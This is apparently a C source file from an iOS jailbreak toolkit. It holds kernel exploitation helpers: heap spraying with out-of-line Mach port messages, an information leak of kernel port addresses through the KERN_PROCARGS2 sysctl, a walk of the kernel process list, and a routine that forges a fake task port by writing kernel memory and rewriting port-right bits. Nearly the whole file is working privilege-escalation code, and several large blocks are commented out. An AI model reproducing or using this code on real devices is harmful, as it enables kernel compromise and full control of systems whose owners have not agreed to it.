#include "exploit_additions.h"
#include "offsets.h"
#include "offsetof.h"
#include "kernel_alloc.h"
#include "kutils.h"
#include "kernel_memory.h"
#include "KernelMemory.h"
#include "../../exploit/vouch_4ya/voucher_swap.h"
#include "../../exploit/v1ntex_sploit/v1ntex_exploit.h"
#include "../../exploit/v1ntex_sploit/v1ntex_offsets.h"

#include "../../exploit/vouch_4ya/parameters.h"


#include "../../post-exploit/utilities/KernelUtilities.h"
#include "../../post-exploit/patchfinder64og.h"

#include "../../headers/jelbrekLib.h"
#import <mach-o/loader.h>
#import <sys/mman.h>
#import <pthread.h>
#undef __IPHONE_OS_VERSION_MIN_REQUIRED
#import <mach/mach.h>
#include <sys/utsname.h>
#include <assert.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/sysctl.h>
#include "../../headers/IOKitLib.h"
#define kIOMasterPortDefault MACH_PORT_NULL
#define MACH_VOUCHER_ATTR_ATM_CREATE ((mach_voucher_attr_recipe_command_t)510)
#define IO_BITS_ACTIVE 0x80000000
#define IKOT_TASK 2
#define IKOT_IOKIT_CONNECT 29
#define IKOT_CLOCK 25

#define kr32(address, value)\
*(uint64_t*) (faketask + 0x380) = address - 0x10;\
pid_for_task(foundport, value);

#define LEAK_TYPE_NECP_PORT 1
#define LEAK_TYPE_PORT 2

typedef struct {
    mach_msg_header_t head;
    mach_msg_body_t msgh_body;
    mach_msg_ool_ports_descriptor_t desc[1];
    char pad[4096];
} sprz;

struct ipc_object {
    natural_t io_bits;
    natural_t io_references;
    char    io_lock_data[0x100];
};

struct ool_msg  {
    mach_msg_header_t hdr;
    mach_msg_body_t body;
    mach_msg_ool_ports_descriptor_t ool_ports;
};

static mach_port_t fill_kalloc_with_port_pointer(mach_port_t *ports, int count, int disposition) {
    // allocate a port to send the message to
    mach_port_t q = MACH_PORT_NULL;
    kern_return_t err;
    err = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &q);
    if (err != KERN_SUCCESS) {
        printf(" [infoleak/fill_kalloc_with_port_pointer] failed to allocate port\n");
        return MACH_PORT_NULL;
    }
    
    
    struct ool_msg* msg = (struct ool_msg*)calloc(1, sizeof(struct ool_msg));
    
    msg->hdr.msgh_bits = MACH_MSGH_BITS_COMPLEX | MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0);
    msg->hdr.msgh_size = (mach_msg_size_t)sizeof(struct ool_msg);
    msg->hdr.msgh_remote_port = q;
    msg->hdr.msgh_local_port = MACH_PORT_NULL;
    msg->hdr.msgh_id = 0x41414141;
    
    msg->body.msgh_descriptor_count = 1;
    
    msg->ool_ports.address = ports;
    msg->ool_ports.count = count;
    msg->ool_ports.deallocate = 0;
    msg->ool_ports.disposition = disposition;
    msg->ool_ports.type = MACH_MSG_OOL_PORTS_DESCRIPTOR;
    msg->ool_ports.copy = MACH_MSG_PHYSICAL_COPY;
    
    err = mach_msg(&msg->hdr,
                   MACH_SEND_MSG|MACH_MSG_OPTION_NONE,
                   (mach_msg_size_t)sizeof(struct ool_msg),
                   0,
                   MACH_PORT_NULL,
                   MACH_MSG_TIMEOUT_NONE,
                   MACH_PORT_NULL);
    
    if (err != KERN_SUCCESS) {
        printf("[infoleak/fill_kalloc_with_port_pointer]: failed to send message: %s\n", mach_error_string(err));
        return MACH_PORT_NULL;
    }
    
    return q;
}

uint64_t try_leak(int leak_type)
{
    uint64_t leak_obj = 0;
    int pid = getpid();
    int name[3] = {CTL_KERN, KERN_PROCARGS2, pid};
    uint8_t oldp[0x204] = {0};
    size_t oldplen = 0x204;
    
    sysctl(name, 3, oldp, &oldplen, NULL, 0);
    
    //uint32_t p_argc = *(uint32_t*)oldp;
    
    uint64_t* p_obj = (uint64_t*)(oldp+4);
    bool leak = true;
    for (int i=0; i<0x200/8; i++) {
        if ((p_obj[i] > 0xfffffff000000000 && ((p_obj[i] & 0x7) == 0)) == false) {
            //        if ((p_obj[i] > 0xffffffe000000000) == false) {

        //if ((p_obj[i] > 0xffffff0000000000 && ((p_obj[i] & 0x5) == 0)) == false && (p_obj[i] < 0xfffffff000000000 && ((p_obj[i] & 0x5) == 0)) == false) {
            leak = false;
            break;
        }
        
        if ((leak_type==LEAK_TYPE_NECP_PORT) &&
            (leak_obj==0) &&
            ((p_obj[i] & 0xff) == 0) &&
            ((p_obj[i] & 0xfff) > 0x500)) {
            leak_obj = p_obj[i];
        }
        else if ((leak_type==LEAK_TYPE_PORT) && (p_obj[i] != p_obj[0])) {
            leak = false;
            break;
        }
    }
    
    if (leak == false)
        return 0;
    
    for (int i=0; i<0x200/8; i+=2) {
        //printf("0x%llx 0x%llx\n", p_obj[i], p_obj[i+1]);
    }
    
    if (leak_type==LEAK_TYPE_PORT) {
        printf("[infoleak/try_leak]: Found our port: %#llx\n", p_obj[0]);
        leak_obj = p_obj[0];
    }
    
    return leak_obj;
}

uint64_t leak_ipc_object(mach_port_t *ports, int num) {
    int n_guesses = 0x4000;
    int leak_count = 0;
    uint64_t leak_obj = 0;
    
    for (int i = 1; i < n_guesses; i++) {
        mach_port_t q = fill_kalloc_with_port_pointer(ports, i%num, MACH_MSG_TYPE_MAKE_SEND);
        if(q == MACH_PORT_NULL) return 0;
        mach_port_destroy(mach_task_self(), q);
        
        leak_obj = try_leak(LEAK_TYPE_NECP_PORT);
        if (leak_obj)
            leak_count ++;
#define MAX_TRY 1
        if(leak_count >= MAX_TRY)
            return leak_obj;
    }
    
    return 0;
}

uint64_t find_port_address(mach_port_t port, int disposition) {
    int n_guesses = 0x2000;
    uint64_t leak_obj = 0;
    
    mach_port_t *ports = (mach_port_t*)malloc(n_guesses * sizeof(mach_port_t));
    
    for (int i=0; i<n_guesses; i++) {
        ports[i] = port;
    }
    
    for (int i = 1; i < n_guesses; i++) {
        mach_port_t q = fill_kalloc_with_port_pointer(ports, i, disposition);
        mach_port_destroy(mach_task_self(), q);
        
        leak_obj = try_leak(LEAK_TYPE_PORT);
        if (leak_obj) {
            break;
        }
    }
    
    if(ports)
        free(ports);
    
    return leak_obj;
}







/*
 for the given mach message size, how big will the ipc_kmsg structure be?
 
 This is defined in ipc_kmsg_alloc, and it's quite complicated to work it out!
 
 The size is overallocated so that if the message was sent from a 32-bit process
 they can expand out the 32-bit ool descriptors to the kernel's 64-bit ones, which
 means that for each descriptor they would need an extra 4 bytes of space for the
 larger pointer. Except at this point they have no idea what's in the message
 so they assume the worst case for all messages. This leads to approximately a 30%
 overhead in the allocation size.
 
 The allocated size also contains space for the maximum trailer plus the ipc_kmsg header.
 
 When the message is actually written into this buffer it's aligned to the end
 */

int message_size_for_kalloc_sizeElectra(int kalloc_size) {
    return ((3*kalloc_size)/4) - 0x74;
}

void prepare_prealloc_port(mach_port_t port) {
    mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
}

int port_has_message(mach_port_t port) {
    kern_return_t err;
    mach_port_seqno_t msg_seqno = 0;
    mach_msg_size_t msg_size = 0;
    mach_msg_id_t msg_id = 0;
    mach_msg_trailer_t msg_trailer; // NULL trailer
    mach_msg_type_number_t msg_trailer_size = sizeof(msg_trailer);
    err = mach_port_peek(mach_task_self(),
                         port,
                         MACH_RCV_TRAILER_NULL,
                         &msg_seqno,
                         &msg_size,
                         &msg_id,
                         (mach_msg_trailer_info_t)&msg_trailer,
                         &msg_trailer_size);
    
    return (err == KERN_SUCCESS);
}

/*
 * Purpose: iterates over the procs and finds a proc with given pid
 */
uint64_t multi_path_get_proc_with_pid(pid_t target_pid, int spawned) {
    
    extern uint64_t kernel_task;
    extern uint64_t task_port_kaddr;
    extern uint64_t newMStask_port_kaddr;
    extern uint64_t VStask_port_kaddr;

    extern uint64_t Vnew_kernel_task_addr;
    extern uint64_t kernel_task_newadd;
    //newself_procV1ntex
    //kernel_task_newadd
    //uint64_t v3task_port_kaddr;
    
    //Vnew_kernel_task_addr = kernel_task;
    uint64_t struct_task;
    printf("[*] kernel_task_newadd : 0x%06llx\n", kernel_task_newadd);
    printf("[*] newMStask_port_kaddr :0x%06llx\n", newMStask_port_kaddr);
    printf("[*] Vnew_kernel_task_addr :0x%06llx\n", Vnew_kernel_task_addr);
    printf("[*] VStask_port_kaddr add :0x%llx\n", VStask_port_kaddr);

    //extern uint64_t cached_task_self_addr;
    if (VStask_port_kaddr != 0){
        printf("[*] VStask_port_kaddr add :0x%llx\n", VStask_port_kaddr);

        struct_task = VStask_port_kaddr;
        printf("[*] VStask_port_kaddr is our struct_task add :0x%llx\n", struct_task);
    }else if (kernel_task_newadd != 0){
        //v3task_port_kaddr = task_self_addr();v3task_port_kaddr
        printf("[*] kernel_task_newadd :0x%06llx\n", kernel_task_newadd);
        printf("[*] Vnew_kernel_task_addr :0x%06llx\n", Vnew_kernel_task_addr);

        struct_task = (kernel_task_newadd + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
        printf("[*] kernel_task_newadd is now struct_task add :0x%llx\n", struct_task);

        
    }else if (newMStask_port_kaddr != 0){
        printf("[*] newMStask_port_kaddr :0x%06llx\n", newMStask_port_kaddr);
        struct_task = (newMStask_port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
        printf("[*] newMStask_port_kaddr struct_task add :0x%llx\n", struct_task);

    }else {
        //kernel_ipc_port_lookup(current_task, port, &portptr, NULL);
        //return portptr;
        //task_port_kaddr + OFFSET(ipc_port, ip_kobject);
        //+ OFFSET(ipc_port, ip_kobject));
        printf("[*] taskport kadd :0x%llx\n", task_port_kaddr);
        struct_task = rk64(task_port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
        printf("[*] struct_task add :0x%llx\n", struct_task);

    }
    printf("our pid: %d\n", target_pid);
    while (struct_task != 0) {
        uint64_t bsd_info = rk64(struct_task + koffset(KSTRUCT_OFFSET_TASK_BSD_INFO));
        // get the process pid
        uint32_t pid = rk32(bsd_info + koffset(KSTRUCT_OFFSET_PROC_PID));
        printf("pid: %x\n", pid);
        if(pid == target_pid) {
            return bsd_info;
        }
        if(spawned) // spawned binaries will exist AFTER our task
            struct_task = rk64(struct_task + koffset(KSTRUCT_OFFSET_TASK_NEXT));
        else
            struct_task = rk64(struct_task + koffset(KSTRUCT_OFFSET_TASK_PREV));
    }
    /*
     uint32_t newtypepid = rk32(bsd_info + koffset(KSTRUCT_OFFSET_PROC_PID));;
     
     uint32_t pid;// = rk32(bsd_info + koffset(KSTRUCT_OFFSET_PROC_PID));
     pid = newtypepid;
     printf("pid: %x\n", pid);
     
     while (pid !=0){
     if (pid < target_pid){
     pid++;
     printf("pid: %x\n", pid);
     
     }
     
     if(pid == target_pid) {
     printf("pid equals target pid : %x\n", pid);
     
     return bsd_info;
     }
     
     }
     */
    return -1; // we failed :/
        
}

uint64_t our_task_addr(){
    uint64_t addr;
    if (VStask_port_kaddr != 0){
        addr = VStask_port_kaddr;
        printf("our_task_addr: 0x%llx\n", addr);
    }else {
        uint64_t our_proc = multi_path_get_proc_with_pid(getpid(), FALSE);//get_proc_struct_for_pid(getpid());//
        if (our_proc == 0) {
            fprintf(stderr,"failed to find our_task_addr!\n");
            exit(EXIT_FAILURE);
        }
        addr = rk64(our_proc + offsetof_task);
        fprintf(stderr,"our_task_addr: 0x%llx\n", addr);
    }
     return addr;
}

uint64_t find_port(mach_port_name_t port){
    uint64_t portptr;
    
    kernel_ipc_port_lookup(current_task, port, &portptr, NULL);

    return portptr;
     
   /* }else {
        
      uint64_t task_addr = our_task_addr();
        
        uint64_t itk_space = rk64(task_addr + offsetof_itk_space);
        
        uint64_t is_table = rk64(itk_space + offsetof_ipc_space_is_table);
        
        uint32_t port_index = port >> 8;
        const int sizeof_ipc_entry_t = 0x18;
        
        uint64_t port_addr = rk64(is_table + (port_index * sizeof_ipc_entry_t));
        return port_addr;
    }
    
    if (kernel_task != 0){
         uint64_t portptr;
         kernel_ipc_port_lookup(current_task, port, &portptr, NULL);
         return portptr;
    }else {  */
  /*  uint64_t VStask_ipc_space;
    if (VStask_port_kaddr != 0 ) {
        uint64_t task_addr = VStask_port_kaddr;//find_port_address(mach_task_self(), MACH_MSG_TYPE_COPY_SEND);//
        printf("task_addr : %llx\n", task_addr);
        //VStask_ipc_space
        //find_port_address(mach_task_self(), MACH_MSG_TYPE_COPY_SEND);///find_port_address(mach_task_self(), MACH_MSG_TYPE_COPY_SEND);
        //current_task
        //        uint64_t task_addr = our_task_addr();
        //task + OFFSET(task, itk_space)
        uint64_t itk_space;
        if (kCFCoreFoundationVersionNumber >= 1535.12){
            //    uint64_t task_ipc_space = kernel_read64(current_task + OFFSET(task, itk_space));

            itk_space = VStask_ipc_space;//rk64(task_addr + OFFSET(task, itk_space));// or 784 decimal try
//OFFSET(task, itk_space)
            printf("[*]        itk_space: 0x%llx\n", itk_space);
            
            printf("[*] VStask_ipc_space: 0x%llx\n", VStask_ipc_space);
            //itk_space = VStask_ipc_space;
            //uint64_t itk_space = rk64(task_addr + OFFSET(task, itk_space));
            //OFFSET(ipc_space, is_table)      = 0x20;
            
            uint64_t is_table = rk64(itk_space + OFFSET(ipc_space, is_table));
            printf("[*] is_table: 0x%llx\n", is_table);

            uint32_t port_index = port >> 8;
            const int sizeof_ipc_entry_t = 0x18;
            
            uint64_t port_addr = rk64(is_table + (port_index * sizeof_ipc_entry_t));
            printf("VFS sploit find port : %llx\n", port_addr);
            return port_addr;
        }else {
        
            itk_space = rk64(task_addr + offsetof_itk_space);
            printf("[*]        itk_space: 0x%llx\n", itk_space);
            
            printf("[*] VStask_ipc_space: 0x%llx\n", VStask_ipc_space);
            //itk_space = VStask_ipc_space;
            //uint64_t itk_space = rk64(task_addr + OFFSET(task, itk_space));
            //OFFSET(ipc_space, is_table)      = 0x20;
            
            uint64_t is_table = rk64(itk_space + offsetof_ipc_space_is_table);
            
            uint32_t port_index = port >> 8;
            const int sizeof_ipc_entry_t = 0x18;
            
            uint64_t port_addr = rk64(is_table + (port_index * sizeof_ipc_entry_t));
            printf("VFS sploit find port : %llx\n", port_addr);
            return port_addr;
        }

        
    }else{
    
            uint64_t task_addr = our_task_addr();//find_port_address(mach_task_self(), MACH_MSG_TYPE_COPY_SEND);//
        printf("task_addr : %llx\n", task_addr);

    //find_port_address(mach_task_self(), MACH_MSG_TYPE_COPY_SEND);///find_port_address(mach_task_self(), MACH_MSG_TYPE_COPY_SEND);
            //current_task
    //        uint64_t task_addr = our_task_addr();
            //task + OFFSET(task, itk_space)
            uint64_t itk_space = rk64(task_addr + offsetof_itk_space);
        printf("itk_space : %llx\n", itk_space);

            //uint64_t itk_space = rk64(task_addr + OFFSET(task, itk_space));

            uint64_t is_table = rk64(itk_space + offsetof_ipc_space_is_table);
            
            uint32_t port_index = port >> 8;
            const int sizeof_ipc_entry_t = 0x18;
            
            uint64_t port_addr = rk64(is_table + (port_index * sizeof_ipc_entry_t));
            printf("VFS sploit find port : %llx\n", port_addr);

            return port_addr;
     //}
    }*/
          
}

uint64_t task_self_addr(void);
uint64_t ipc_space_kernel(void);

void convert_port_to_task_port(mach_port_t port, uint64_t space, uint64_t task_kaddr) {
    // now make the changes to the port object to make it a task port:
    uint64_t port_kaddr = find_port(port);
    
    wk32(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IO_BITS), IO_BITS_ACTIVE | IKOT_TASK);
    wk32(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IO_REFERENCES), 0xf00d);
    wk32(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_SRIGHTS), 0xf00d);
    wk64(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_RECEIVER), space);
    wk64(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT),  task_kaddr);
    
    // swap our receive right for a send right:
    uint64_t task_port_addr = task_self_addr();
    uint64_t task_addr = rk64(task_port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
    uint64_t itk_space = rk64(task_addr + OFFSET(task, itk_space));
    //uint64_t itk_space = rk64(task_addr + koffset(KSTRUCT_OFFSET_TASK_ITK_SPACE));
//OFFSET(task, itk_space)
    ///uint64_t is_table = rk64(itk_space + OFFSET(ipc_space, is_table));
    uint64_t is_table = kernel_read64(itk_space + OFFSET(ipc_space, is_table));

    //uint64_t is_table = rk64(itk_space + koffset(KSTRUCT_OFFSET_IPC_SPACE_IS_TABLE));
    
    uint32_t port_index = port >> 8;
    const int sizeof_ipc_entry_t = 0x18;
    uint32_t bits = rk32(is_table + (port_index * sizeof_ipc_entry_t) + 8); // 8 = offset of ie_bits in struct ipc_entry
    
#define IE_BITS_SEND (1<<16)
#define IE_BITS_RECEIVE (1<<17)
    
    bits &= (~IE_BITS_RECEIVE);
    bits |= IE_BITS_SEND;
    
    wk32(is_table + (port_index * sizeof_ipc_entry_t) + 8, bits);
}


void make_port_fake_task_port(mach_port_t port, uint64_t task_kaddr) {
    convert_port_to_task_port(port, ipc_space_kernel(), task_kaddr);
}

